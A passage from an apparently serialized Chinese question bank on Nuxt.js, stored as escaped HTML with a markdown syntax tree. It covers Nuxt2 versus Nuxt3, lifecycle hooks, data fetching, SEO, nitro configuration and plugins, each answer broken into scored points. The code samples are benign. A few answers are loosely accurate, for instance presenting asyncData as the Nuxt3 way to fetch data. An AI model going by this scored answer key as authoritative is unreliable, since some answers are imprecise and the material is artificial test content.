作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。</li>\\n<li><strong>1：</strong> 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。</li>\\n<li><strong>1：</strong> TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。</li>\\n<li><strong>1：</strong> Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。</li>\\n<li><strong>2：</strong> Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。</li>\\n</ul>\\n</details>\\n\\n<h2>Nuxt.js的生命周期有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 服务器端生命周期：</p>\\n<ul>\\n<li>nuxtServerInit：在服务端初始化数据</li>\\n<li>middleware：中间件执行</li>\\n<li>validate()：验证动态路由参数</li>\\n<li>asyncData()：异步数据加载</li>\\n<li>fetch()：服务端数据获取</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> Vue生命周期（服务端）：</p>\\n<ul>\\n<li>beforeCreate：组件实例化之前</li>\\n<li>created：组件创建完成</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> Vue生命周期（客户端）：</p>\\n<ul>\\n<li>beforeMount：DOM挂载之前</li>\\n<li>mounted：DOM挂载完成</li>\\n<li>beforeUpdate：数据更新前</li>\\n<li>updated：数据更新后</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 页面特定钩子：</p>\\n<ul>\\n<li>transition：页面过渡效果</li>\\n<li>head：设置页面元信息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 注意事项：</p>\\n<ul>\\n<li>服务端只能访问beforeCreate和created</li>\\n<li>window/document只能在mounted中使用</li>\\n<li>asyncData/fetch在每次路由变化时都会调用</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>Nuxt.js中的数据获取方式有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> asyncData方法：</p>\\n<ul>\\n<li>在组件初始化前调用</li>\\n<li>可以返回Promise</li>\\n<li>返回的数据会合并到组件data中</li>\\n<li>只能在页面组件中使用</li>\\n</ul>\\n<pre><code class=\\"language-js\\">async asyncData({ $axios }) {\\n  const data = await $axios.$get(&#39;/api/data&#39;)\\n  return { data }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> fetch方法：</p>\\n<ul>\\n<li>可在任何组件中使用</li>\\n<li>不直接返回数据</li>\\n<li>通常用于填充Vuex状态</li>\\n</ul>\\n<pre><code class=\\"language-js\\">async fetch() {\\n  const { data } = await this.$axios.$get(&#39;/api/data&#39;)\\n  this.items = data\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> Vuex操作：</p>\\n<ul>\\n<li>nuxtServerInit初始化存储</li>\\n<li>store中的actions获取数据</li>\\n<li>支持模块化管理</li>\\n</ul>\\n<pre><code class=\\"language-js\\">export const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(&#39;/api/data&#39;)\\n    commit(&#39;SET_DATA&#39;, data)\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> API调用最佳实践：</p>\\n<ul>\\n<li>使用@nuxtjs/axios模块</li>\\n<li>统一管理API请求</li>\\n<li>处理错误和加载状态</li>\\n<li>实现数据缓存策略</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>Nuxt.js的SEO优化方案有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> Meta标签管理：</p>\\n<pre><code class=\\"language-js\\">head() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: &#39;description&#39;, name: &#39;description&#39;, content: this.description },\\n      { hid: &#39;keywords&#39;, name: &#39;keywords&#39;, content: this.keywords }\\n    ]\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 服务端渲染(SSR)：</p>\\n<ul>\\n<li>预渲染完整HTML</li>\\n<li>更好的首屏加载</li>\\n<li>搜索引擎可直接爬取内容</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.js\\nexport default {\\n  ssr: true\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 静态站点生成(SSG)：</p>\\n<ul>\\n<li>构建时生成静态HTML</li>\\n<li>适合内容不常更新的站点</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.js\\nexport default {\\n  target: &#39;static&#39;,\\n  generate: {\\n    routes: [&#39;/posts/1&#39;, &#39;/posts/2&#39;]\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 结构化数据：</p>\\n<ul>\\n<li>实现JSON-LD</li>\\n<li>添加Schema.org标记</li>\\n<li>提供更丰富的搜索结果</li>\\n</ul>\\n<pre><code class=\\"language-js\\">head() {\\n  return {\\n    script: [{\\n      type: &#39;application/ld+json&#39;,\\n      json: {\\n        &quot;@context&quot;: &quot;https://schema.org&quot;,\\n        &quot;@type&quot;: &quot;Article&quot;,\\n        &quot;headline&quot;: this.title\\n      }\\n    }]\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 性能优化：</p>\\n<ul>\\n<li>图片懒加载</li>\\n<li>资源预加载</li>\\n<li>代码分割</li>\\n<li>缓存策略</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}\\n</code></pre>\\n</li>\\n</ul>\\n<h2>如何在 Nuxt.js 中配置和使用环境变量？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如<code>API_URL=&lt;http://localhost:3000/api（开发环境下的&gt; API 地址）</code>。</li>\\n<li><strong>1：</strong> 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">modules: [\\n  &#39;@nuxtjs/dotenv&#39;\\n]\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。</li>\\n</ul>\\n<h2>nuxt2常用的组件有哪些</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> <code>&lt;Nuxt&gt;</code>Nuxt 框架中的核心组件;</p>\\n</li>\\n<li><p><code>&lt;NuxtLink&gt;</code>用于在 Nuxt 应用内部进行页面导航;</p>\\n</li>\\n<li><p><code>&lt;ClientOnly&gt;</code>只在客户端被渲染和执行;</p>\\n</li>\\n<li><p><code>&lt;NoSSR&gt;</code>用来处理不适合在服务端渲染的内容;</p>\\n</li>\\n<li><p><code>&lt;Transition&gt;</code>用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。</p>\\n</li>\\n<li><p><strong>1：</strong> <code>&lt;NuxtChild&gt;</code>主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;</p>\\n</li>\\n<li><p><code>&lt;KeepAlive&gt;</code>保留组件的状态，让它在切换后依然保持之前的状态;</p>\\n</li>\\n<li><p><code>&lt;slot&gt;</code>用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.</p>\\n</li>\\n</ul>\\n<h2>nuxt3常用的组件有哪些</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> <code>&lt;NuxtPage&gt;</code>类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、</p>\\n</li>\\n<li><p><code>&lt;NuxtLink&gt;</code>用于在 Nuxt 应用内部进行页面导航；</p>\\n</li>\\n<li><p><code>&lt;ClientOnly&gt;</code>只在客户端被渲染和执行；</p>\\n</li>\\n<li><p><code>&lt;Transition&gt;</code>用于给页面或组件的切换添加过渡动画效果；</p>\\n</li>\\n<li><p><code>&lt;KeepAlive&gt;</code>保留组件的状态，让它在切换后依然保持之前的状态；</p>\\n</li>\\n<li><p><code>&lt;Suspense&gt;</code>在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；</p>\\n</li>\\n<li><p><strong>1：</strong> <code>&lt;NuxtLayout&gt;</code>用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;</p>\\n</li>\\n<li><p><code>&lt;NoSSR&gt;</code>用来处理不适合在服务端渲染的内容；</p>\\n</li>\\n<li><p><code>&lt;slot&gt;</code>用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；</p>\\n</li>\\n<li><p><code>&lt;NuxtImg&gt;</code>；</p>\\n</li>\\n<li><p><code>&lt;NuxtPicture&gt;</code>。</p>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">export default { \\n async asyncData(ctx) { \\n   const data = await ctx.$axios.get(&#39;/api/data&#39;); \\n   return { \\n     fetchedData: data \\n   }; \\n } \\n}\\n</code></pre>\\n<h2>Nuxt3 的路由懒加载是如何实现的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。</li>\\n<li><strong>1：</strong> 在定义路由时，使用箭头函数返回 <code>import()</code> 导入的组件，例如 <code>{ path: &#39;/about&#39;, component: () =&gt; import(&#39;~/pages/About.vue&#39;) }</code>，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。</li>\\n</ul>\\n<h2>Nuxt3 中如何定义全局样式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： <code>[&#39;~/assets/css/global.css&#39;]</code>, 使样式在整个应用中生效。</li>\\n</ul>\\n<h2>请解释 Nuxt3 中 nitro 的作用及关键配置项</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配</li>\\n<li><strong>1：</strong> 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    preset: &#39;node-server&#39;\\n  }\\n}\\n//在上述配置中，选择 node-server 预设，表示应用将以适合在传统 Node.js 服务器上运行的方式进行构建，生成对应的可执行代码和相关配置。如果设置为 serverless，\\n// 例如 preset: &#39;serverless&#39;，则会按照无服务器架构的要求对应用进行构建，以便能够部署到像 AWS Lambda 这样的无服务器环境中，nitro 会自动处理相关的代码打包、资源管理等差异，确保应用正常运行。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    routeRules: {\\n      &#39;/&#39;: {\\n        cache: {\\n          maxAge: 60 * 10 // 为首页设置缓存时间，这里是 10 分钟\\n        }\\n      },\\n      &#39;/about&#39;: {\\n        redirect: {\\n          destination: &#39;/&#39;, // 将访问 /about 页面重定向到首页\\n          statusCode: 302\\n        }\\n      },\\n      &#39;/api/data&#39;: {\\n        headers: {\\n          &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39; // 为 /api/data 路由设置响应头，允许跨域访问\\n        }\\n      }\\n    }\\n  }\\n}\\n//在这个示例中，针对应用的根路由（/）设置了缓存策略，即用户首次访问后，在接下来的 10 分钟内再次访问该页面时，服务器可以直接从缓存中获取页面内容并返回，减\\n// 少服务器处理负担；对于 /about 页面配置了重定向规则，当用户访问该页面时会以 302 状态码重定向到首页；而 /api/data 路由则通过设置响应头，解决了该路由的跨域访问问题，方便前端与之交互。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    devProxy: {\\n      &#39;/api&#39;: {\\n        target: &#39;http://localhost:3000/api&#39;, // 后端 API 服务器的实际地址\\n        changeOrigin: true\\n      }\\n    }\\n  }\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    output: {\\n      dir: &#39;dist&#39;, // 设置构建输出目录为 dist\\n      publicDir: &#39;public&#39;, // 设定公共资源目录为 public\\n      format: &#39;esm&#39; // 设置模块格式为 ESM（ECMAScript 模块），也可根据需求选择其他格式\\n    }\\n  }\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    plugins: [&#39;./server/plugins/myPlugin.ts&#39;]\\n  }\\n}\\n</code></pre>\\n</details>\\n\\n<h2>请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>3：</strong> Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。</li>\\n<li><strong>2：</strong> 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">export default function (context, inject) {\\n  const myLogger = (message) =&gt; {\\n    console.log(`[MyLogger] ${message}`);\\n  };\\n  inject(&#39;myLogger&#39;, myLogger);\\n}\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# Nuxt\\n\\n","depth":1,"text":"Nuxt","tokens":[{"type":"text","raw":"Nuxt","text":"Nuxt","escaped":false}]},{"type":"heading","raw":"## Nuxt.js和Vue.js有什么区别？\\n\\n","depth":2,"text":"Nuxt.js和Vue.js有什么区别？","tokens":[{"type":"text","raw":"Nuxt.js和Vue.js有什么区别？","text":"Nuxt.js和Vue.js有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"* **1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。\\n* **1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。\\n* **1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。\\n","task":false,"loose":false,"text":"**1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","tokens":[{"type":"text","raw":"**1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","text":"**1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","text":" 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。\\n","task":false,"loose":false,"text":"**1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","tokens":[{"type":"text","raw":"**1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","text":"**1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","text":" 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","task":false,"loose":false,"text":"**1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","tokens":[{"type":"text","raw":"**1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","text":"**1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","text":" 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt有哪些特性？\\n\\n","depth":2,"text":"nuxt有哪些特性？","tokens":[{"type":"text","raw":"nuxt有哪些特性？","text":"nuxt有哪些特性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"* **1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。\\n* **1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。\\n* **1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。\\n* **1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。\\n* **1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。\\n* **1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。\\n* **1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 服务器端渲染(SSR)：Nuxt.js 